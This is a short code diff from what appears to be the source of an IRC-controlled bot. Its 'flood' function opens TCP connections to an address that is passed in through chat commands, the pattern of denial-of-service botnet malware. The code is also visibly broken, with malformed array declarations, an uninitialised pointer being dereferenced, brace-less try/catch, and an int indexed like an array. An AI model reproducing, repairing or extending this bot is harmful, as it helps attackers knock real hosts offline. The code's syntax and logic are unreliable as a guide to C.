@@ -30,12 +30,12 @@ char ChanPass[] = "pass";
 int Sock;
 bool Connected;
 
-void flood(char* addr, int count) {
+void flood(char addr, int count) {
 	int sock, i = 0;
 	sockaddr *sa;
 	char buf = [MAX_LINE_SIZE];
 	sa->sa_family = AF_INET;
-	sa->sa_data = *addr;
+	sa->sa_data = addr;
 	memset(buf, 1, sizeof(buf));
 	do sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)
 	while (sock < 0);
@@ -187,7 +187,7 @@ int Irc_Parse_Command(char *CurrentChannel, char *Line)
 					int a;
 					try a = std::stoi(a[2]);
 					catch return -4;
-					flood(a);
+					flood(a[1], a[2]);
 				}
 			}
 		}
